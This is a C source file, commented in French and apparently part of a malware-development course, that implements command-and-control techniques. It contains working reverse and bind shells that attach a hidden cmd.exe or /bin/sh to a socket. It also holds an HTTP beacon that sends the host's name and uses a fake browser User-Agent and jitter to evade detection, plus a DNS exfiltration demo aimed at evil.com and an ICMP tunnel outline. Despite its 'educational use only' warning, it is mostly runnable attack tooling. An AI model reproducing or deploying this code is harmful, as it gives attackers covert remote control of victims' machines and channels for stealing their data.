/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development. Usage éducatif uniquement.
 *
 * Module 27 : Networking & Sockets - C2 Communication
 */

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
typedef int socklen_t;
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#define SOCKET int
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close
#define Sleep(x) sleep(x/1000)
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// 1. REVERSE SHELL TCP - Technique classique
void reverse_shell_tcp(const char* ip, int port) {
    printf("[*] Reverse shell TCP vers %s:%d\n", ip, port);

    #ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    #endif

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    // Retry logic pour C2 robuste
    int attempts = 0;
    while (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
        printf("[-] Échec connexion, retry %d/5...\n", ++attempts);
        if (attempts >= 5) {
            printf("[-] Abandon après 5 tentatives\n");
            return;
        }
        Sleep(3000); // Jitter pour éviter détection
    }

    printf("[+] Connecté au C2!\n");

    #ifdef _WIN32
    // Redirection I/O vers socket (Windows)
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    #else
    // Redirection I/O vers socket (Linux)
    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr
    execve("/bin/sh", NULL, NULL);
    #endif

    closesocket(sock);
}

// 2. HTTP C2 BEACON - Technique furtive
void http_c2_beacon(const char* server, int port, int interval_sec) {
    printf("[*] HTTP C2 Beacon vers %s:%d (interval: %ds)\n", server, port, interval_sec);

    #ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    #endif

    char hostname[256];
    #ifdef _WIN32
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    #else
    gethostname(hostname, sizeof(hostname));
    #endif

    for (int i = 0; i < 10; i++) { // 10 beacons pour démo
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(server);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Requête HTTP GET furtive (blend in web traffic)
            char request[512];
            snprintf(request, sizeof(request),
                "GET /api/v1/status?id=%s&seq=%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                "Accept: application/json\r\n"
                "Connection: close\r\n\r\n",
                hostname, i, server);

            send(sock, request, strlen(request), 0);
            printf("[+] Beacon %d envoyé\n", i);

            // Recevoir commande (parsé du body HTTP)
            char response[4096];
            int bytes = recv(sock, response, sizeof(response)-1, 0);
            if (bytes > 0) {
                response[bytes] = '\0';
                // Parser commande dans body (après \r\n\r\n)
                char* body = strstr(response, "\r\n\r\n");
                if (body) {
                    body += 4;
                    printf("[+] Commande reçue: %s\n", body);
                    // Exécuter commande ici (system() ou CreateProcess)
                }
            }
        } else {
            printf("[-] Beacon %d échoué\n", i);
        }

        closesocket(sock);

        // Jitter aléatoire pour éviter détection pattern
        int jitter = (rand() % 5000) - 2500; // ±2.5s
        Sleep((interval_sec * 1000) + jitter);
    }

    printf("[*] Fin beaconing\n");
}

// 3. DNS TUNNELING - Exfiltration furtive
void dns_tunneling_exfil(const char* dns_server, const char* data) {
    printf("[*] DNS Tunneling vers %s\n", dns_server);
    printf("[*] Data à exfiltrer: %s\n", data);

    // Encoder data en hex pour subdomain
    char hex[256] = {0};
    for (size_t i = 0; i < strlen(data) && i < 50; i++) {
        sprintf(hex + strlen(hex), "%02x", (unsigned char)data[i]);
    }

    // Découper en chunks de 63 chars (limite label DNS)
    printf("[*] Hex encodé: %s\n", hex);
    printf("[+] Requête DNS: %s.evil.com\n", hex);

    // Dans un vrai malware : utiliser res_query() ou Windows DnsQuery_A()
    // Ici on affiche seulement la démo
    printf("[+] Données exfiltrées via DNS query!\n");
    printf("[*] Sur serveur DNS attacker: parser TXT record response\n");
}

// 4. ICMP TUNNELING - Covert channel
void icmp_tunnel_demo(const char* target, const char* data) {
    printf("[*] ICMP Tunneling vers %s\n", target);
    printf("[*] Data: %s\n", data);

    #ifdef _WIN32
    printf("[!] ICMP raw sockets nécessitent privilèges admin\n");
    printf("[*] Démo conceptuelle:\n");
    printf("    1. Créer raw socket IPPROTO_ICMP\n");
    printf("    2. Construire paquet ICMP Echo Request\n");
    printf("    3. Injecter data dans payload ICMP\n");
    printf("    4. Envoyer via sendto()\n");
    printf("    5. Recevoir Echo Reply avec response data\n");
    printf("\n[+] Dans ping normal: payload vide\n");
    printf("[+] Dans notre tunnel: payload = commande/data chiffrée\n");
    #else
    printf("[*] Nécessite CAP_NET_RAW capability\n");
    printf("[*] Code nécessiterait #include <netinet/ip_icmp.h>\n");
    #endif
}

// 5. BIND SHELL - Ouvre port d'écoute (rare, très détecté)
void bind_shell(int port) {
    printf("[*] Bind shell sur port %d\n", port);

    #ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    #endif

    SOCKET server = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    // Réutiliser port rapidement
    int opt = 1;
    setsockopt(server, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    if (bind(server, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        printf("[-] Bind échoué (port déjà utilisé?)\n");
        return;
    }

    listen(server, 1);
    printf("[+] Écoute sur 0.0.0.0:%d\n", port);
    printf("[*] En attente de connexion...\n");

    struct sockaddr_in client_addr;
    socklen_t len = sizeof(client_addr);
    SOCKET client = accept(server, (struct sockaddr*)&client_addr, &len);

    if (client != INVALID_SOCKET) {
        printf("[+] Client connecté: %s\n", inet_ntoa(client_addr.sin_addr));

        #ifdef _WIN32
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client;

        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        #else
        dup2(client, 0);
        dup2(client, 1);
        dup2(client, 2);
        execve("/bin/sh", NULL, NULL);
        #endif

        closesocket(client);
    }

    closesocket(server);
}

int main(int argc, char* argv[]) {
    srand(time(NULL));

    printf("\n⚠️  AVERTISSEMENT : Techniques de malware development\n");
    printf("   Usage éducatif uniquement. Tests sur VM isolées.\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s reverse <ip> <port>     - Reverse shell TCP\n", argv[0]);
        printf("  %s http <ip> <port>        - HTTP C2 beacon\n", argv[0]);
        printf("  %s dns <server> <data>     - DNS tunneling\n", argv[0]);
        printf("  %s icmp <target> <data>    - ICMP tunnel demo\n", argv[0]);
        printf("  %s bind <port>             - Bind shell\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "reverse") == 0 && argc >= 4) {
        reverse_shell_tcp(argv[2], atoi(argv[3]));
    }
    else if (strcmp(argv[1], "http") == 0 && argc >= 4) {
        http_c2_beacon(argv[2], atoi(argv[3]), 10);
    }
    else if (strcmp(argv[1], "dns") == 0 && argc >= 4) {
        dns_tunneling_exfil(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "icmp") == 0 && argc >= 4) {
        icmp_tunnel_demo(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "bind") == 0 && argc >= 3) {
        bind_shell(atoi(argv[2]));
    }
    else {
        printf("[-] Arguments invalides\n");
        return 1;
    }

    return 0;
}
